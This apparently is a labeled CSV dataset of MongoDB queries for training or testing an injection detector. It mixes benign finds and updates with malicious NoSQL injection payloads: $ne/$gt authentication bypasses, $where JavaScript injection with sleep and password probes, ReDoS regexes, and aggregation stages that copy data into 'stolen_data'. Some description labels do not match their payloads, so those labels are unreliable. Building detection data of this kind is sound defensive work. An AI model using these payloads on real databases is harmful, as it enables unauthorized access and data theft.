id,label,type,collection,query,full_command,description,timestamp
8424,benign,update_query,articles,"{""filter"": {""_id"": ""52f1b8c8-30b4-4f64-a550-25dd3763a3b1""}, ""update"": {""$set"": {""name"": ""\u4f55\u5f3a""}}}","db.articles.updateOne({""_id"": ""52f1b8c8-30b4-4f64-a550-25dd3763a3b1""}, {""$set"": {""name"": ""\u4f55\u5f3a""}})",Document update operation,2025-11-24T21:15:54.519610
8425,benign,count_query,articles,"{""status"": ""active""}","db.articles.countDocuments({""status"": ""active""})",Document count query,2025-11-24T21:15:54.421211
8426,malicious,operator_injection,customers,"{""username"": {""$lt"": """"}}","db.customers.find({""username"": {""$lt"": """"}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.320104
8427,malicious,operator_injection,accounts,"{""username"": ""anthony02"", ""password"": {""$ne"": """"}}","db.accounts.find({""username"": ""anthony02"", ""password"": {""$ne"": """"}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.340068
8428,malicious,json_injection,users,"{""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]}","db.users.find({""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.314540
8429,malicious,operator_injection,orders,"{""email"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.orders.find({""email"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $gt operator to bypass authentication or leak data,2025-11-24T21:15:54.340914
8430,malicious,type_confusion,sessions,"{""admin"": {""$type"": ""string""}}","db.sessions.find({""admin"": {""$type"": ""string""}})",Exploiting type system for injection attack,2025-11-24T21:15:54.347800
8431,malicious,aggregation_injection,orders,"[{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}]","db.orders.aggregate([{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.319710
8432,malicious,json_injection,transactions,"{""username"": ""admin"", ""$or"": [{""1"": ""1""}]}","db.transactions.find({""username"": ""admin"", ""$or"": [{""1"": ""1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.299968
8433,malicious,array_injection,products,"{""user_id"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}}","db.products.find({""user_id"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}})",Injection through array operators,2025-11-24T21:15:54.291138
8434,benign,update_query,sessions,"{""filter"": {""_id"": ""6ce470af-e63c-412e-8373-c5c71112d66c""}, ""update"": {""$set"": {""name"": ""\u5f20\u6842\u82b1""}}}","db.sessions.updateOne({""_id"": ""6ce470af-e63c-412e-8373-c5c71112d66c""}, {""$set"": {""name"": ""\u5f20\u6842\u82b1""}})",Document update operation,2025-11-24T21:15:54.480734
8435,malicious,or_injection,transactions,"{""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]}","db.transactions.find({""$or"": [{""password"": {""$exists"": true}}, {""password"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.333682
8436,malicious,where_injection,logs,"{""$where"": ""function() { sleep(5000); return true; }""}","db.logs.find({""$where"": ""function() { sleep(5000); return true; }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.357998
8437,benign,count_query,users,{},db.users.countDocuments({}),Document count query,2025-11-24T21:15:54.375896
8438,malicious,or_injection,accounts,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.accounts.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.311784
8439,benign,count_query,articles,"{""category"": ""books""}","db.articles.countDocuments({""category"": ""books""})",Document count query,2025-11-24T21:15:54.416339
8440,malicious,regex_injection,transactions,"{""name"": {""$regex"": ""([a-zA-Z]+)*$""}}","db.transactions.find({""name"": {""$regex"": ""([a-zA-Z]+)*$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.333498
8441,malicious,or_injection,users,"{""$or"": [{""username"": ""admin""}, {""1"": ""1""}]}","db.users.find({""$or"": [{""username"": ""admin""}, {""1"": ""1""}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.310635
8442,benign,distinct_query,customers,"{""field"": ""country""}","db.customers.distinct(""country"")",Field distinct query,2025-11-24T21:15:54.516111
8443,benign,simple_find,sessions,"{""name"": ""Pamela Gill""}","db.sessions.find({""name"": ""Pamela Gill""})",Simple field match query,2025-11-24T21:15:54.544629
8444,malicious,aggregation_injection,users,"[{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}]","db.users.aggregate([{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.359098
8445,benign,find_with_limit,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}).skip(56).limit(96)",Query with pagination,2025-11-24T21:15:54.400411
8446,benign,find_with_sort,users,{},"db.users.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.381764
8447,malicious,operator_injection,products,"{""username"": ""patrickhoward"", ""password"": {""$ne"": """"}}","db.products.find({""username"": ""patrickhoward"", ""password"": {""$ne"": """"}})",Using $gte operator to bypass authentication or leak data,2025-11-24T21:15:54.303008
8448,benign,simple_find,users,"{""email"": ""stephenwright@example.org""}","db.users.find({""email"": ""stephenwright@example.org""})",Simple field match query,2025-11-24T21:15:54.474054
8449,benign,distinct_query,products,"{""field"": ""country""}","db.products.distinct(""country"")",Field distinct query,2025-11-24T21:15:54.468161
8450,benign,find_with_sort,products,{},"db.products.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.455147
8451,benign,count_query,sessions,{},db.sessions.countDocuments({}),Document count query,2025-11-24T21:15:54.422382
8452,benign,find_with_limit,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}).skip(497).limit(48)",Query with pagination,2025-11-24T21:15:54.369403
8453,malicious,aggregation_injection,orders,"[{""$redact"": {""$cond"": {""if"": true, ""then"": ""$$DESCEND"", ""else"": ""$$PRUNE""}}}]","db.orders.aggregate([{""$redact"": {""$cond"": {""if"": true, ""then"": ""$$DESCEND"", ""else"": ""$$PRUNE""}}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.327845
8454,benign,simple_find,products,"{""username"": ""melindastone""}","db.products.find({""username"": ""melindastone""})",Simple field match query,2025-11-24T21:15:54.484496
8455,malicious,operator_injection,transactions,"{""username"": ""lloydamanda"", ""password"": {""$ne"": """"}}","db.transactions.find({""username"": ""lloydamanda"", ""password"": {""$ne"": """"}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.327295
8456,benign,find_with_sort,users,{},"db.users.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.402294
8457,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.438881
8458,malicious,regex_injection,sessions,"{""token"": {""$regex"": ""([a-zA-Z]+)*$""}}","db.sessions.find({""token"": {""$regex"": ""([a-zA-Z]+)*$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.347696
8459,benign,distinct_query,articles,"{""field"": ""brand""}","db.articles.distinct(""brand"")",Field distinct query,2025-11-24T21:15:54.479402
8460,malicious,where_injection,users,"{""$where"": ""this.password.match(/^a/)""}","db.users.find({""$where"": ""this.password.match(/^a/)""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.336543
8461,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.401836
8462,malicious,or_injection,orders,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.orders.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.338506
8463,malicious,where_injection,users,"{""$where"": ""function() { sleep(5000); return true; }""}","db.users.find({""$where"": ""function() { sleep(5000); return true; }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.310889
8464,benign,simple_find,logs,"{""role"": ""user""}","db.logs.find({""role"": ""user""})",Simple field match query,2025-11-24T21:15:54.527767
8465,benign,find_with_limit,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}).skip(370).limit(32)",Query with pagination,2025-11-24T21:15:54.496815
8466,malicious,aggregation_injection,transactions,"[{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}]","db.transactions.aggregate([{""$match"": {""$where"": ""1==1""}}, {""$out"": ""stolen_data""}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.359430
8467,benign,simple_find,customers,"{""role"": ""user""}","db.customers.find({""role"": ""user""})",Simple field match query,2025-11-24T21:15:54.533076
8468,benign,find_with_projection,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.469080
8469,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(26).limit(76)",Query with pagination,2025-11-24T21:15:54.565896
8470,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.537867
8471,malicious,operator_injection,logs,"{""_id"": {""$ne"": null}}","db.logs.find({""_id"": {""$ne"": null}})",Using $ne operator to bypass authentication or leak data,2025-11-24T21:15:54.301645
8472,malicious,json_injection,sessions,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.sessions.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.350679
8473,benign,find_with_projection,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.419236
8474,malicious,array_injection,transactions,"{""role"": {""$all"": [{""$elemMatch"": {""$gt"": """"}}]}}","db.transactions.find({""role"": {""$all"": [{""$elemMatch"": {""$gt"": """"}}]}})",Injection through array operators,2025-11-24T21:15:54.307996
8475,benign,find_with_projection,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}, {""password"": 0})",Query with field projection,2025-11-24T21:15:54.399111
8476,malicious,where_injection,logs,"{""$where"": ""this.password.match(/^a/)""}","db.logs.find({""$where"": ""this.password.match(/^a/)""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.300751
8477,malicious,operator_injection,users,"{""name"": {""$lt"": """"}}","db.users.find({""name"": {""$lt"": """"}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.317655
8478,malicious,aggregation_injection,users,"[{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}]","db.users.aggregate([{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.323871
8479,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(17).limit(74)",Query with pagination,2025-11-24T21:15:54.510168
8480,malicious,or_injection,users,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.users.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.337578
8481,benign,count_query,customers,{},db.customers.countDocuments({}),Document count query,2025-11-24T21:15:54.423348
8482,malicious,or_injection,orders,"{""$or"": [{""username"": ""admin""}, {""1"": ""1""}]}","db.orders.find({""$or"": [{""username"": ""admin""}, {""1"": ""1""}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.303066
8483,malicious,type_confusion,customers,"{""token"": {""$type"": ""string""}}","db.customers.find({""token"": {""$type"": ""string""}})",Exploiting type system for injection attack,2025-11-24T21:15:54.292673
8484,malicious,where_injection,accounts,"{""$where"": ""this.password.length > 0""}","db.accounts.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.341065
8485,benign,insert_query,products,"{""name"": ""Progressive explicit database"", ""price"": 928.36, ""category"": ""clothing"", ""stock"": 784, ""rating"": 3.6, ""brand"": ""\u51cc\u9896\u4fe1\u606f\u7f51\u7edc\u6709\u9650\u516c\u53f8""}","db.products.insertOne({""name"": ""Progressive explicit database"", ""price"": 928.36, ""category"": ""clothing"", ""stock"": 784, ""rating"": 3.6, ""brand"": ""\u51cc\u9896\u4fe1\u606f\u7f51\u7edc\u6709\u9650\u516c\u53f8""})",Document insert operation,2025-11-24T21:15:54.428558
8486,benign,simple_find,orders,"{""category"": ""electronics""}","db.orders.find({""category"": ""electronics""})",Simple field match query,2025-11-24T21:15:54.422967
8487,benign,delete_query,users,"{""status"": ""deleted""}","db.users.deleteOne({""status"": ""deleted""})",Document delete operation,2025-11-24T21:15:54.383230
8488,malicious,type_confusion,logs,"{""email"": null}","db.logs.find({""email"": null})",Exploiting type system for injection attack,2025-11-24T21:15:54.303499
8489,benign,find_with_projection,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}, {""password"": 0})",Query with field projection,2025-11-24T21:15:54.370451
8490,malicious,where_injection,logs,"{""$where"": ""this.password.length > 0""}","db.logs.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.297718
8491,malicious,regex_injection,customers,"{""status"": {""$regex"": ""admin.*"", ""$options"": ""i""}}","db.customers.find({""status"": {""$regex"": ""admin.*"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.342237
8492,malicious,where_injection,transactions,"{""$where"": ""this.password.length > 0""}","db.transactions.find({""$where"": ""this.password.length > 0""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.349736
8493,malicious,operator_injection,customers,"{""admin"": {""$gt"": """"}}","db.customers.find({""admin"": {""$gt"": """"}})",Using $gt operator to bypass authentication or leak data,2025-11-24T21:15:54.359091
